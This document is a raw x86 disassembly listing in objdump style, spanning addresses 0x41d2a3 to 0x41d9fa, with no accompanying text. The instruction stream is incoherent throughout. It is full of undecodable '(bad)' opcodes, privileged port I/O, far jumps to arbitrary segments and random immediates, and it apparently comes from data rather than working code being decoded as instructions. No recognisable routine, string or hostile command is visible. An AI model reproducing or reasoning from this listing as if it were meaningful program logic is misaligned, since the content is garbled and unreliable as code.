  41d2a3:	xchg   ecx,eax
  41d2a4:	aad    0xf2
  41d2a6:	pop    esp
  41d2a7:	nop
  41d2a8:	std    
  41d2a9:	add    eax,0x1752ff09
  41d2ae:	and    DWORD PTR [edi+0x392cd301],ecx
  41d2b4:	stos   BYTE PTR es:[edi],al
  41d2b5:	(bad)
  41d2b9:	mov    ds:0xd812c9c8,al
  41d2be:	scas   eax,DWORD PTR es:[edi]
  41d2bf:	sub    al,0xac
  41d2c1:	sub    DWORD PTR [eax-0x5a],edi
  41d2c4:	sub    cl,BYTE PTR [ebx+0x19]
  41d2c7:	js     0x41d297
  41d2c9:	(bad)
  41d2cc:	(bad)  
  41d2cd:	outs   dx,DWORD PTR ds:[si]
  41d2cf:	mov    bh,cl
  41d2d1:	sub    DWORD PTR [esi-0x68],ecx
  41d2d4:	mov    al,0x4e
  41d2d6:	push   ebx
  41d2d7:	and    al,0x93
  41d2d9:	jno    0x41d2fe
  41d2db:	pop    ebx
  41d2dc:	sahf   
  41d2dd:	mov    dh,BYTE PTR [eax]
  41d2df:	mov    ds:0xad1e0a3f,eax
  41d2e4:	or     eax,0x6751710a
  41d2e9:	and    al,0xeb
  41d2eb:	mov    dl,0x62
  41d2ed:	adc    al,0x49
  41d2ef:	cmp    BYTE PTR [esi+0x6e],ch
  41d2f2:	inc    esi
  41d2f3:	outs   dx,BYTE PTR ds:[si]
  41d2f5:	test   DWORD PTR [ecx+0xa943cf7],esp
  41d2fb:	cmp    DWORD PTR [edi],esi
  41d2fd:	(bad)  
  41d2ff:	hlt    
  41d300:	outs   dx,DWORD PTR ds:[esi]
  41d301:	sbb    eax,0x5446fc9f
  41d306:	pop    es
  41d307:	jnp    0x41d30b
  41d309:	loope  0x41d37c
  41d30b:	cli    
  41d30c:	in     al,dx
  41d30d:	ins    DWORD PTR es:[edi],dx
  41d30e:	sub    al,0x7d
  41d310:	in     al,dx
  41d311:	cmp    al,BYTE PTR [eax+0x39f7d475]
  41d317:	add    al,0x7c
  41d319:	das    
  41d31a:	xor    eax,0xc4676735
  41d31f:	xchg   DWORD PTR [ebp+0x10c6394e],ebx
  41d325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d326:	jno    0x41d2e4
  41d328:	addr16 push eax
  41d32a:	data16 mov dl,0xa4
  41d32d:	lea    ecx,[eax-0x71ce8915]
  41d333:	sar    BYTE PTR [eax+ebp*1+0x29d39464],0x2a
  41d33b:	mov    dl,0xe3
  41d33d:	push   ebx
  41d33e:	icebp  
  41d33f:	sub    edi,esp
  41d341:	and    DWORD PTR [ebx-0x3dfeb86e],edi
  41d347:	je     0x41d308
  41d349:	jbe    0x41d2f3
  41d34b:	cmp    DWORD PTR [edx-0x57],edi
  41d34e:	mov    ebx,0x577de91e
  41d353:	in     al,dx
  41d354:	mov    dl,0x9f
  41d356:	cmp    al,ch
  41d358:	inc    BYTE PTR [esi-0x66]
  41d35b:	fdivr  DWORD PTR [ecx+0x69]
  41d35e:	jle    0x41d2e6
  41d360:	jecxz  0x41d353
  41d362:	test   bl,bl
  41d364:	dec    ecx
  41d365:	lods   eax,DWORD PTR ds:[esi]
  41d366:	sub    eax,0x7c03eacf
  41d36b:	xor    eax,0x7a2b7f12
  41d370:	dec    ecx
  41d371:	pop    ebp
  41d372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d373:	stc    
  41d374:	call   0x3896:0x217dbe77
  41d37b:	ficom  WORD PTR [eax-0x47]
  41d37e:	out    dx,eax
  41d37f:	push   0x99a76f4a
  41d384:	adc    ch,ah
  41d386:	add    BYTE PTR [ecx],ch
  41d388:	icebp  
  41d389:	in     al,0x59
  41d38b:	pop    edx
  41d38c:	mov    ebp,0x331b6805
  41d391:	enter  0xd692,0xb3
  41d395:	(bad)  
  41d397:	jmp    0x41d3b3
  41d399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d39a:	mov    cl,0xa6
  41d39c:	gs daa 
  41d39e:	js     0x41d38d
  41d3a0:	inc    esi
  41d3a1:	inc    ebp
  41d3a2:	dec    esi
  41d3a3:	lock xchg ebx,eax
  41d3a5:	inc    ecx
  41d3a6:	pop    eax
  41d3a7:	or     al,0x70
  41d3a9:	ins    DWORD PTR es:[edi],dx
  41d3aa:	(bad)  
  41d3ab:	enter  0x3ddb,0x56
  41d3af:	push   esp
  41d3b0:	dec    ebp
  41d3b1:	or     eax,0x718778e7
  41d3b6:	xor    al,0x3d
  41d3b8:	(bad)  
  41d3b9:	lods   eax,DWORD PTR ds:[esi]
  41d3ba:	jne    0x41d3f1
  41d3bc:	(bad)  
  41d3bd:	loope  0x41d41d
  41d3bf:	(bad)  
  41d3c1:	mov    bl,ch
  41d3c3:	inc    ebp
  41d3c4:	pop    ecx
  41d3c5:	stos   DWORD PTR es:[edi],eax
  41d3c6:	mov    ds:0x75ff7abb,al
  41d3cb:	xchg   ebx,eax
  41d3cc:	mov    dh,0xfe
  41d3ce:	addr16 cwde 
  41d3d0:	push   es
  41d3d1:	out    0xd6,eax
  41d3d3:	rcl    dh,0x7d
  41d3d6:	ret    0xf8de
  41d3d9:	loop   0x41d37b
  41d3db:	ss inc eax
  41d3dd:	loop   0x41d448
  41d3df:	call   0x6318:0xacaa1f5e
  41d3e6:	icebp  
  41d3e7:	xchg   esi,eax
  41d3e8:	cmp    ebp,ebx
  41d3ea:	jecxz  0x41d3bd
  41d3ec:	loopne 0x41d38e
  41d3ee:	dec    ecx
  41d3ef:	cs hlt 
  41d3f1:	cmp    al,0x6e
  41d3f3:	out    dx,al
  41d3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3f5:	in     eax,0xd0
  41d3f7:	scas   al,BYTE PTR es:[edi]
  41d3f8:	scas   al,BYTE PTR es:[edi]
  41d3f9:	dec    edx
  41d3fa:	add    bh,bl
  41d3fc:	sbb    al,0x1d
  41d3fe:	mov    esp,0xb6a05d2d
  41d403:	mov    ah,0xa9
  41d405:	push   ecx
  41d406:	out    0xfc,al
  41d408:	pop    ebx
  41d409:	cld    
  41d40a:	xchg   ecx,eax
  41d40b:	call   0x94a292cb
  41d410:	outs   dx,DWORD PTR ds:[esi]
  41d411:	aaa    
  41d412:	sub    BYTE PTR [esi],0x94
  41d415:	jl     0x41d436
  41d417:	pop    eax
  41d418:	mov    eax,0xd7408a03
  41d41d:	mov    ecx,0x866862b1
  41d422:	sar    BYTE PTR [edx+0x39],1
  41d425:	sar    DWORD PTR [ecx+0x2c],1
  41d428:	or     al,0x53
  41d42a:	cdq    
  41d42b:	mov    ss,WORD PTR [ecx+esi*4+0x4c987394]
  41d432:	lods   eax,DWORD PTR ds:[esi]
  41d433:	cmp    al,BYTE PTR [ebp-0x40519971]
  41d439:	adc    esp,ebp
  41d43b:	and    al,0x91
  41d43d:	(bad)  
  41d43e:	dec    eax
  41d43f:	fild   DWORD PTR [edi+0x39]
  41d442:	cs dec eax
  41d444:	cwde   
  41d445:	dec    ebx
  41d447:	outs   dx,DWORD PTR ds:[esi]
  41d448:	add    ebx,DWORD PTR [ecx-0x3c91d664]
  41d44e:	push   edx
  41d44f:	add    eax,0x912d717d
  41d454:	stos   BYTE PTR es:[edi],al
  41d455:	gs sbb ecx,DWORD PTR ds:[esi]
  41d459:	pushf  
  41d45a:	inc    DWORD PTR [esi-0x5b2d678c]
  41d460:	sub    DWORD PTR [edx],0x5e
  41d463:	add    al,0xc3
  41d465:	jg     0x41d487
  41d467:	inc    ebx
  41d468:	int    0x34
  41d46a:	mov    al,ds:0x9045a6dc
  41d46f:	mov    bh,0xff
  41d471:	xor    BYTE PTR [ebx],dh
  41d473:	pop    ss
  41d474:	and    eax,0x1326a592
  41d479:	inc    eax
  41d47a:	mov    cl,0x52
  41d47c:	es cmp al,0xe6
  41d47f:	or     BYTE PTR [edi],cl
  41d481:	inc    ebp
  41d482:	mov    ah,0x4c
  41d484:	push   ecx
  41d485:	dec    bh
  41d487:	sub    ax,0x2b4a
  41d48b:	xchg   ecx,eax
  41d48c:	(bad)  
  41d48d:	mov    esi,0x6c85cc20
  41d492:	test   al,0xb0
  41d494:	dec    esp
  41d495:	jmp    0x82cb297a
  41d49a:	aas    
  41d49b:	push   ss
  41d49c:	dec    esi
  41d49d:	outs   dx,DWORD PTR ds:[esi]
  41d49e:	div    BYTE PTR ss:[ebx-0x14]
  41d4a2:	int    0x50
  41d4a4:	adc    cl,BYTE PTR [esi+0x1b2afff0]
  41d4aa:	add    DWORD PTR [ebp-0x770e64f5],esi
  41d4b0:	push   ecx
  41d4b1:	mov    ss,WORD PTR [ecx]
  41d4b3:	stos   DWORD PTR es:[edi],eax
  41d4b4:	out    0x9b,al
  41d4b6:	jbe    0x41d489
  41d4b8:	or     eax,0xa42e8d39
  41d4bd:	or     eax,DWORD PTR [edi+0x76fbfb03]
  41d4c3:	mov    esi,0x34e36741
  41d4c8:	add    ebp,DWORD PTR [ebp+0x1d]
  41d4cb:	in     al,0x3a
  41d4cd:	sbb    dl,0xad
  41d4d0:	test   BYTE PTR [edi],ah
  41d4d2:	dec    esp
  41d4d3:	push   es
  41d4d4:	or     al,0x2f
  41d4d6:	pop    esi
  41d4d7:	(bad)  
  41d4d8:	mov    esp,0x5ae44d9d
  41d4dd:	popf   
  41d4de:	mov    ch,0x99
  41d4e0:	pop    ebx
  41d4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4e2:	sahf   
  41d4e3:	lahf   
  41d4e4:	lds    ecx,FWORD PTR [edi]
  41d4e6:	sar    DWORD PTR [ebx+edx*2+0x5527608e],1
  41d4ed:	jns    0x41d548
  41d4ef:	pop    ebx
  41d4f0:	out    0xe7,al
  41d4f2:	mov    ecx,0x8ccc6346
  41d4f7:	xchg   esi,eax
  41d4f8:	jns    0x41d4cb
  41d4fa:	test   al,0x77
  41d4fc:	push   ss
  41d4fd:	test   DWORD PTR [esi+0x15217ba7],edx
  41d503:	mov    esi,0x9c896f41
  41d508:	fs cld 
  41d50a:	cmp    BYTE PTR [esi+0x1ce6248c],ch
  41d510:	pop    ss
  41d511:	retf   
  41d512:	stc    
  41d513:	jg     0x41d4df
  41d515:	leave  
  41d516:	adc    DWORD PTR [ebx-0x4a45a36a],eax
  41d51c:	(bad)  
  41d51d:	cwde   
  41d51e:	and    al,0x87
  41d520:	pop    esp
  41d521:	not    BYTE PTR [edi+0x2d]
  41d524:	outs   dx,DWORD PTR ds:[esi]
  41d525:	loopne 0x41d4ba
  41d527:	mov    ebx,ecx
  41d529:	enter  0x2844,0x32
  41d52d:	mov    eax,ds:0x7d7c05dd
  41d532:	jmp    0x34b7a8ad
  41d537:	xchg   ebp,eax
  41d538:	jl     0x41d516
  41d53a:	or     edi,ecx
  41d53c:	data16 cli 
  41d53e:	mov    edi,0x9012725e
  41d543:	jp     0x41d5ab
  41d545:	sub    ebx,DWORD PTR [ebx]
  41d547:	aas    
  41d548:	pusha  
  41d549:	and    al,0x25
  41d54b:	rol    BYTE PTR [edi],1
  41d54d:	fwait
  41d54e:	lds    ecx,FWORD PTR [ebp+0x43]
  41d551:	out    dx,eax
  41d552:	xor    DWORD PTR [edx-0x4211e5e4],ebp
  41d558:	push   esi
  41d559:	out    0xa7,al
  41d55b:	pusha  
  41d55c:	xor    esp,DWORD PTR [edx-0x27]
  41d55f:	add    DWORD PTR [ecx+0x27b8e262],esp
  41d565:	mov    bl,0xc2
  41d567:	jo     0x41d514
  41d569:	push   eax
  41d56a:	jle    0x41d5d8
  41d56c:	cs pushw 0xc57a
  41d571:	jo     0x41d55b
  41d573:	jecxz  0x41d51b
  41d575:	ret    0xd68
  41d578:	jle    0x41d5f9
  41d57a:	fmul   DWORD PTR [edx]
  41d57c:	data16 add BYTE PTR cs:[ecx+0x27061b81],cl
  41d584:	popf   
  41d585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d586:	xor    ebp,esi
  41d588:	outs   dx,BYTE PTR ds:[esi]
  41d589:	fwait
  41d58a:	lods   al,BYTE PTR ds:[esi]
  41d58b:	loope  0x41d5f0
  41d58d:	xor    eax,0xfe3dd686
  41d592:	(bad)  
  41d593:	fistp  QWORD PTR [edi-0xb9a1cc0]
  41d599:	push   ebp
  41d59a:	lahf   
  41d59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d59d:	sbb    DWORD PTR [edi+ecx*8-0x23],edi
  41d5a1:	jo     0x41d599
  41d5a3:	fdivrp st(1),st
  41d5a5:	pop    ecx
  41d5a6:	sbb    BYTE PTR [edx+0x4c79516c],dh
  41d5ac:	add    edi,DWORD PTR [ecx]
  41d5ae:	shr    ecx,0x1f
  41d5b1:	push   edi
  41d5b2:	in     eax,0x30
  41d5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5b5:	pushf  
  41d5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5b7:	jl     0x41d580
  41d5b9:	jo     0x41d5cc
  41d5bb:	popa   
  41d5bc:	imul   ebx,DWORD PTR [ecx+eiz*8+0x14],0xffffffbc
  41d5c1:	xor    edi,DWORD PTR [ebx+0x40]
  41d5c4:	pop    ebx
  41d5c5:	pop    ss
  41d5c6:	cmp    eax,0x55abafd4
  41d5cb:	adc    BYTE PTR [esi-0x15],ah
  41d5ce:	mov    WORD PTR [edx],es
  41d5d0:	shl    BYTE PTR [ebp-0x124408a5],0x94
  41d5d7:	xor    al,0x1d
  41d5d9:	jne    0x41d5fd
  41d5db:	mov    ecx,0x71fab411
  41d5e0:	test   eax,0x8a9626da
  41d5e5:	mov    al,dl
  41d5e7:	push   cs
  41d5e8:	pop    ds
  41d5e9:	sbb    al,0x58
  41d5eb:	fisttp QWORD PTR [eax-0x659b7fb0]
  41d5f1:	pop    ss
  41d5f2:	dec    esp
  41d5f3:	es ret 
  41d5f5:	inc    ebx
  41d5f6:	rcl    BYTE PTR [eax-0x6a3fe43d],cl
  41d5fc:	push   edx
  41d5fd:	mov    eax,0x43aff855
  41d602:	fcmovnbe st,st(0)
  41d604:	jbe    0x41d5c3
  41d606:	daa    
  41d607:	adc    eax,0x455ed9f3
  41d60c:	and    ebp,edi
  41d60e:	pop    edx
  41d60f:	xchg   BYTE PTR [ebp-0x772740d2],ch
  41d615:	jo     0x41d671
  41d617:	push   edx
  41d618:	cmp    eax,0x88dc11cf
  41d61d:	cmp    ch,dh
  41d61f:	(bad)  
  41d620:	cli    
  41d621:	(bad)  
  41d622:	cmp    eax,0x331362d1
  41d627:	sub    cl,BYTE PTR [ecx+0x6b74e01b]
  41d62d:	out    0xb3,eax
  41d62f:	(bad)  
  41d630:	jnp    0x41d5d7
  41d632:	sub    ecx,DWORD PTR [esi]
  41d634:	dec    esp
  41d635:	out    0x1c,al
  41d637:	inc    BYTE PTR [edx+0x37]
  41d63a:	sti    
  41d63b:	jno    0x41d6bc
  41d63d:	mov    ecx,0x1fe7ba01
  41d642:	aaa    
  41d643:	mov    dh,0x50
  41d645:	mov    DWORD PTR [ecx-0x6cd5e5f3],0x2ffaacdc
  41d64f:	pand   mm3,QWORD PTR [ebp+0x6e]
  41d653:	inc    ecx
  41d654:	bound  edx,QWORD PTR [ebp+0x58]
  41d657:	in     al,dx
  41d658:	les    edi,FWORD PTR [eax+0x7c]
  41d65b:	mov    al,ds:0x1115a82
  41d660:	in     al,0xae
  41d662:	mov    al,0x3c
  41d664:	sti    
  41d665:	loopne 0x41d641
  41d667:	jae    0x41d65e
  41d669:	mov    dh,0x3
  41d66b:	mov    al,ds:0x8e4e7d60
  41d670:	push   cs
  41d671:	sti    
  41d672:	mov    ebx,0xe39257cf
  41d677:	add    DWORD PTR [ebp+0x7f],0xffffffac
  41d67b:	mov    eax,esp
  41d67d:	in     eax,0x7f
  41d67f:	inc    esp
  41d680:	inc    esi
  41d681:	jle    0x41d695
  41d683:	daa    
  41d684:	mov    al,0xec
  41d686:	push   cs
  41d687:	fistp  WORD PTR [ebx-0x2c6dde1a]
  41d68d:	add    ebx,ecx
  41d68f:	stos   DWORD PTR es:[edi],eax
  41d690:	push   ss
  41d691:	mov    BYTE PTR [ebp-0x41],cl
  41d694:	clc    
  41d695:	(bad)  
  41d696:	clc    
  41d697:	push   edx
  41d698:	pop    edx
  41d699:	jo     0x41d6a1
  41d69b:	stos   DWORD PTR es:[edi],eax
  41d69c:	hlt    
  41d69d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d69e:	cli    
  41d69f:	jmp    0xfa4c:0xb41f35f0
  41d6a6:	adc    edi,DWORD PTR [eax+0x2d3b9f74]
  41d6ac:	and    al,0xdf
  41d6ae:	mov    edx,0x620ab8d5
  41d6b3:	push   ebx
  41d6b4:	mov    cl,0xe7
  41d6b6:	repz scas eax,DWORD PTR es:[edi]
  41d6b8:	mov    eax,ds:0x84984346
  41d6bd:	cmp    BYTE PTR [ebx],ah
  41d6bf:	clc    
  41d6c0:	pop    esp
  41d6c1:	jns    0x41d738
  41d6c3:	and    BYTE PTR [edx],0x72
  41d6c6:	jb     0x41d6c6
  41d6c8:	rol    DWORD PTR [edi+edx*8-0x383e358d],0x58
  41d6d0:	sbb    esp,esi
  41d6d2:	call   0xc137:0xf5ffedc9
  41d6d9:	fstp   QWORD PTR [eax+0x1d880863]
  41d6df:	xlat   BYTE PTR ds:[ebx]
  41d6e0:	cmp    ch,bh
  41d6e2:	shl    DWORD PTR [ecx],0x3d
  41d6e5:	test   BYTE PTR [ebx],dl
  41d6e7:	stc    
  41d6e8:	popa   
  41d6e9:	mov    edi,0xf59b847a
  41d6ee:	sbb    BYTE PTR [ebx+ebp*8],0x6d
  41d6f2:	or     ebp,eax
  41d6f4:	sti    
  41d6f5:	(bad)
  41d6f9:	aaa    
  41d6fa:	retf   
  41d6fb:	adc    eax,0xc9092f26
  41d700:	jnp    0x41d77e
  41d702:	nop
  41d703:	fs push edx
  41d705:	imul   eax,DWORD PTR [eax-0x3a568f07],0x52
  41d70c:	and    BYTE PTR [ecx+ecx*1+0x6d75648c],0xa
  41d714:	adc    DWORD PTR [eax],ebp
  41d716:	dec    eax
  41d717:	out    dx,eax
  41d718:	sub    DWORD PTR [edi-0x38c48d4f],0xaee22a92
  41d722:	push   ecx
  41d723:	add    eax,0x12bb04b6
  41d728:	fwait
  41d729:	daa    
  41d72a:	pop    esp
  41d72b:	mov    fs,ebx
  41d72d:	adc    ebx,0x13
  41d730:	inc    edi
  41d731:	or     BYTE PTR [ecx],ah
  41d733:	pop    edi
  41d734:	mov    ebp,0x43213003
  41d739:	jne    0x41d75f
  41d73b:	cmp    eax,0x47ae4ec2
  41d740:	jp     0x41d726
  41d742:	jnp    0x41d6fb
  41d744:	out    0x28,eax
  41d746:	pushf  
  41d747:	repnz xchg esp,eax
  41d749:	sbb    DWORD PTR [eax+eiz*2+0x32],ecx
  41d74d:	xchg   BYTE PTR fs:[edx+0x1d630ec1],ah
  41d754:	test   BYTE PTR [eax+ebp*8-0x343296be],bh
  41d75b:	mov    bh,0xd1
  41d75d:	fisttp DWORD PTR [ecx]
  41d75f:	stc    
  41d760:	cmp    eax,0xdd4f9c88
  41d765:	xor    bl,BYTE PTR [ebp+0x7c]
  41d768:	mov    esi,0xe5d4c3c6
  41d76d:	out    0xb9,eax
  41d76f:	mov    ecx,0x9cedb8ea
  41d774:	repnz out 0x5a,eax
  41d777:	pushf  
  41d778:	imul   ecx,ebp,0xffffff80
  41d77b:	pop    eax
  41d77c:	cmp    al,0xff
  41d77e:	out    0xe0,al
  41d780:	add    BYTE PTR [ecx],ah
  41d782:	or     eax,0xdcb3fdca
  41d787:	cmovp  ebx,DWORD PTR [esi-0x4674daf0]
  41d78e:	ins    BYTE PTR es:[edi],dx
  41d78f:	jp     0x41d7a9
  41d791:	add    BYTE PTR [edx+0x4529115a],bh
  41d797:	imul   edx,DWORD PTR [edi],0xe4c94639
  41d79d:	dec    edx
  41d79e:	sti    
  41d79f:	sbb    BYTE PTR [ecx],al
  41d7a1:	dec    edi
  41d7a2:	mov    ecx,0xe352e99a
  41d7a7:	pop    edi
  41d7a8:	mov    al,0x4e
  41d7aa:	out    dx,eax
  41d7ab:	xchg   esp,eax
  41d7ac:	sbb    ebp,DWORD PTR [edx-0x23]
  41d7af:	loope  0x41d820
  41d7b1:	cmc    
  41d7b2:	retf   0x8ae3
  41d7b5:	clc    
  41d7b6:	sbb    eax,0x2e328b02
  41d7bb:	ror    BYTE PTR [ebp+0x841c0e5],1
  41d7c1:	xor    al,BYTE PTR [ebp+ecx*4-0x28643845]
  41d7c8:	add    BYTE PTR [edx-0x1f60686e],dl
  41d7ce:	jbe    0x41d7a9
  41d7d0:	lahf   
  41d7d1:	rol    DWORD PTR [edi-0x2906189a],0x8f
  41d7d8:	or     al,0x47
  41d7da:	cmp    BYTE PTR [edx+0x2ac5e74],dh
  41d7e0:	add    BYTE PTR [ebx-0x2a6db7a3],ah
  41d7e6:	adc    eax,0x73662363
  41d7eb:	(bad)  
  41d7ec:	jg     0x41d784
  41d7ee:	call   0xa82:0x6888b1c8
  41d7f5:	scas   eax,DWORD PTR es:[edi]
  41d7f6:	or     bl,0x7
  41d7f9:	jle    0x41d78f
  41d7fb:	inc    eax
  41d7fc:	jb     0x41d78f
  41d7fe:	ins    DWORD PTR es:[edi],dx
  41d7ff:	icebp  
  41d800:	pop    esp
  41d801:	mov    edx,0x36df5a11
  41d806:	and    DWORD PTR [ebx],esi
  41d808:	lea    esp,[ebx]
  41d80a:	add    ebp,DWORD PTR [eax-0x7a6c593a]
  41d810:	cwde   
  41d811:	es push 0x8d446a4f
  41d817:	add    edi,DWORD PTR [ecx+0x51f9c3c0]
  41d81d:	out    dx,al
  41d81e:	in     al,0xfd
  41d820:	fmul   QWORD PTR [edi+eiz*8+0x71286896]
  41d827:	lea    esi,[eax+0x1f12c4b0]
  41d82d:	mov    ah,0xc5
  41d82f:	pop    ebx
  41d830:	cdq    
  41d831:	mov    cl,0x1d
  41d833:	ins    DWORD PTR es:[edi],dx
  41d834:	pop    edx
  41d835:	dec    esi
  41d836:	pop    es
  41d837:	arpl   WORD PTR [edi+0x2],sp
  41d83a:	dec    edx
  41d83b:	dec    esi
  41d83c:	xlat   BYTE PTR ds:[ebx]
  41d83d:	repnz mov bh,BYTE PTR [ebp+edx*4+0x2f]
  41d842:	or     al,0xc3
  41d844:	(bad)  
  41d845:	repnz and eax,0xd93ccf1
  41d84b:	ja     0x41d7dc
  41d84d:	push   esi
  41d84e:	enter  0xa6f,0x49
  41d852:	push   edx
  41d853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d854:	xor    edx,DWORD PTR [edi+0x1accfca6]
  41d85a:	push   ecx
  41d85b:	and    BYTE PTR [ebp-0x53],bh
  41d85e:	loope  0x41d80e
  41d860:	xchg   ebx,eax
  41d861:	adc    eax,0xb38c6cd4
  41d866:	jl     0x41d8ac
  41d868:	int3   
  41d869:	in     al,dx
  41d86a:	outs   dx,BYTE PTR ds:[esi]
  41d86b:	neg    DWORD PTR [esi+0x45ef4ab4]
  41d871:	and    dh,bh
  41d873:	pop    ds
  41d874:	push   edx
  41d875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d876:	xor    DWORD PTR [eax],ecx
  41d878:	sub    al,0xb2
  41d87a:	mov    eax,ds:0xd2c544bd
  41d87f:	add    BYTE PTR [edx-0xd867e06],dl
  41d885:	mov    ebp,0x32c6260c
  41d88a:	jecxz  0x41d845
  41d88c:	jl     0x41d893
  41d88e:	loope  0x41d8dd
  41d890:	mov    ebp,0xbca6ace8
  41d895:	cmp    al,0xea
  41d897:	into   
  41d898:	push   es
  41d899:	pop    esp
  41d89a:	dec    ebx
  41d89b:	in     al,0xcc
  41d89d:	adc    dh,bl
  41d89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8a0:	ret    
  41d8a1:	add    DWORD PTR [edx+0x32],0xe904dc6b
  41d8a8:	mov    WORD PTR [edi+0x2c],ss
  41d8ab:	push   ss
  41d8ac:	sar    DWORD PTR [edi],cl
  41d8ae:	ror    esi,0x6
  41d8b1:	pop    ebx
  41d8b2:	push   ecx
  41d8b3:	neg    edx
  41d8b5:	sub    al,BYTE PTR [edi+0x5]
  41d8b8:	adc    BYTE PTR [ecx],ch
  41d8ba:	cld    
  41d8bb:	and    ecx,DWORD PTR [esi]
  41d8bd:	fwait
  41d8be:	cmp    BYTE PTR [edi],0xe8
  41d8c1:	rcl    DWORD PTR [ebp+0x29],1
  41d8c4:	es xchg esi,eax
  41d8c6:	aaa    
  41d8c7:	ret    
  41d8c8:	mov    ds:0xbedabbff,eax
  41d8cd:	int3   
  41d8ce:	and    dh,BYTE PTR [eax+0x11]
  41d8d1:	cmp    al,0xbe
  41d8d3:	test   al,0x41
  41d8d5:	ins    DWORD PTR es:[edi],dx
  41d8d6:	mov    ebx,ebx
  41d8d8:	(bad)  
  41d8d9:	scas   al,BYTE PTR es:[edi]
  41d8da:	loope  0x41d8f5
  41d8dc:	lahf   
  41d8dd:	pop    edi
  41d8de:	pop    esp
  41d8df:	mov    cl,0xb1
  41d8e1:	and    esp,esi
  41d8e3:	iret   
  41d8e4:	jo     0x41d8a1
  41d8e6:	mov    ebx,0x6ff19c6b
  41d8eb:	add    dh,BYTE PTR [eax-0x53047172]
  41d8f1:	sti    
  41d8f2:	xor    al,0xd6
  41d8f4:	js     0x41d890
  41d8f6:	idiv   edi
  41d8f8:	xchg   ecx,eax
  41d8f9:	mov    ebx,DWORD PTR [esi]
  41d8fb:	push   edx
  41d8fc:	dec    eax
  41d8fd:	xor    eax,0x3b39d29d
  41d902:	fimul  DWORD PTR ss:[ecx-0x940b7f5]
  41d909:	mov    eax,ds:0x36491401
  41d90e:	fwait
  41d90f:	mov    al,0x58
  41d911:	lahf   
  41d912:	clc    
  41d913:	enter  0x3f32,0xb
  41d917:	test   DWORD PTR [esi-0x74],edx
  41d91a:	xchg   esi,eax
  41d91b:	out    0x5c,eax
  41d91d:	cdq    
  41d91e:	cmp    DWORD PTR [esi-0x718e9cac],esp
  41d924:	in     al,dx
  41d925:	dec    edi
  41d926:	sub    al,0x98
  41d928:	ss jno 0x41d983
  41d92b:	push   0x26
  41d92d:	jnp    0x41d8e4
  41d92f:	xchg   ebp,eax
  41d930:	inc    edi
  41d931:	jmp    0x8aef:0x1cf0e8d0
  41d938:	shr    BYTE PTR [eax],1
  41d93a:	pop    es
  41d93b:	fbstp  TBYTE PTR [eax]
  41d93d:	jmp    0x41d9a5
  41d93f:	and    DWORD PTR [eax+ecx*4-0x10],eax
  41d943:	into   
  41d944:	or     BYTE PTR [eax+0x73],ah
  41d947:	sbb    DWORD PTR ds:0x9e7873fb,esp
  41d94d:	daa    
  41d94e:	and    al,ah
  41d950:	in     eax,0x8f
  41d952:	stc    
  41d953:	mov    esp,0x70d9261d
  41d958:	hlt    
  41d959:	adc    bh,BYTE PTR [ecx]
  41d95b:	in     eax,0x9d
  41d95d:	mov    ebx,0xdbb1e6c7
  41d962:	mov    ebx,0xa13ebf39
  41d967:	cmp    al,0xc4
  41d969:	sub    BYTE PTR [ebp+0x6c],0x48
  41d96d:	jg     0x41d99e
  41d96f:	es dec ecx
  41d971:	mul    DWORD PTR [eax+edi*2]
  41d974:	push   ss
  41d975:	test   BYTE PTR [ecx],dh
  41d977:	xor    al,BYTE PTR [esi+0xa]
  41d97a:	xchg   esp,eax
  41d97b:	xchg   ebx,eax
  41d97c:	fwait
  41d97d:	or     eax,0xf2677a44
  41d982:	add    al,0x26
  41d984:	lods   al,BYTE PTR ds:[esi]
  41d985:	jbe    0x41d918
  41d987:	add    BYTE PTR [edx],bh
  41d989:	push   ds
  41d98a:	sub    ah,dl
  41d98c:	shl    ebp,0x50
  41d98f:	jnp    0x41d960
  41d991:	add    DWORD PTR [ebp+0x6930d4e],esp
  41d997:	aad    0xea
  41d999:	test   ch,dh
  41d99b:	adc    al,0xe4
  41d99d:	sub    BYTE PTR [edx-0x45],0x3c
  41d9a1:	sti    
  41d9a2:	push   ss
  41d9a3:	jl     0x41d9d1
  41d9a5:	mov    cl,0x64
  41d9a7:	or     ecx,DWORD PTR [eax+0x1e0b8c4a]
  41d9ad:	mov    esi,0x30b18bc7
  41d9b2:	outs   dx,DWORD PTR ds:[esi]
  41d9b3:	fistp  QWORD PTR [eax+ecx*4+0x7f]
  41d9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9b8:	fiadd  DWORD PTR [edi+0x1f]
  41d9bb:	mov    cl,0xe5
  41d9bd:	dec    esi
  41d9be:	and    ecx,DWORD PTR [edx+0x70]
  41d9c1:	xor    al,0xf9
  41d9c3:	pusha  
  41d9c4:	pop    ebx
  41d9c5:	jmp    0x26e8:0x607c8f15
  41d9cc:	sub    al,0x66
  41d9ce:	in     al,dx
  41d9cf:	fdivr  QWORD PTR [edx-0x3b]
  41d9d2:	cmp    ecx,edx
  41d9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9d5:	xchg   DWORD PTR [esi+0x57],esi
  41d9d8:	into   
  41d9d9:	ret    0x496b
  41d9dc:	mov    WORD PTR [eax+0x5cb77900],?
  41d9e2:	retf   
  41d9e3:	mov    ah,0x4a
  41d9e5:	cmp    DWORD PTR [edi+0x19],edi
  41d9e8:	push   edx
  41d9e9:	(bad)  
  41d9ea:	ins    DWORD PTR es:[edi],dx
  41d9eb:	cmp    eax,0x7189c3a8
  41d9f0:	sbb    cl,BYTE PTR [edx]
  41d9f2:	aaa    
  41d9f3:	add    eax,0x6aaae715
  41d9f8:	pushf  
  41d9f9:	dec    ecx
  41d9fa:	neg    DWORD PTR [eax-0x725c198f]
